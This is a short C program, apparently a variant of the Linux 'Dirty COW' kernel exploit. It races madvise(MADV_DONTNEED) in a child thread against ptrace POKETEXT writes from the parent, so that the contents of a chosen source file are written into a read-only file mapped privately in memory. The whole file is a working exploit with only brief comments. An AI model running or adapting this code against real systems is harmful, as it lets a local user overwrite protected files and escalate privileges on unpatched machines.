#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include <errno.h>

int f;// file descriptor
void *map;// memory map
pid_t pid;// process id
pthread_t pth;// thread
struct stat st;// file info

void *madviseThread(void *arg)
{
  int i,c=0;// counters
  for(i=0;i<200000;i++)
    c+=madvise(map,100,MADV_DONTNEED);// race condition
  printf("madvise %d\n\n",c);// sum of errors
}


int main(int argc,char *argv[]){
  if(argc<3)
    return 1;
  printf("%s %s\n", argv[1], argv[2]);
  f=open(argv[1],O_RDONLY);// open read only file
  fstat(f,&st);// stat the fd
  
  int file_size = st.st_size;
  
  map=mmap(NULL,
           file_size+sizeof(long),// size is filesize plus padding
           PROT_READ,// read-only
           MAP_PRIVATE,// private mapping for cow
           f,// file descriptor
           0);// zero
  printf("mmap %lx\n\n",(unsigned long)map);// sum of error code
  pid=fork();// fork process 
  if(pid)
  { 
    int fd_source;
    fd_source = open (argv[2], O_RDONLY);
    if(fd_source == -1)
    {
        perror("source");
        return -1;
    }
    
    ssize_t ret;
    ssize_t len = file_size;
    char buf[len];
    while (len != 0 && (ret = read (fd_source, buf, len)) != 0)
    {
        if(ret == -1)
        {
            if (errno == EINTR)
                continue;
            perror ("read");
            break;
        }
        len -= ret;
       // buf += ret;
    }
    
    printf("%s", buf);
    
    waitpid(pid,NULL,0);
    int u,i,o,c=0,l=strlen(buf);
    for(i=0;i<200/l;i++)
      for(o=0;o<l;o++)
        for(u=0;u<200;u++)
        {
           int ret =ptrace(PTRACE_POKETEXT  ,// inject into memory
                    pid                    ,// process id
                    map+o                  ,// address
                    *((long*)(buf+o)));
    //                    *((long*)(argv[2]+o))) ;// value
          c+= ret;
          if(ret)
          {
            perror("ptrace error");
          }
        }            
    printf("ptrace %d\n\n",c);// sum of error code
  }
  else
  {
    pthread_create(&pth,NULL,madviseThread,NULL);// null
    ptrace(PTRACE_TRACEME);
    kill(getpid(),SIGSTOP);// signal parent
    pthread_join(pth,NULL);// wait for thread
  }
  return 0;
}
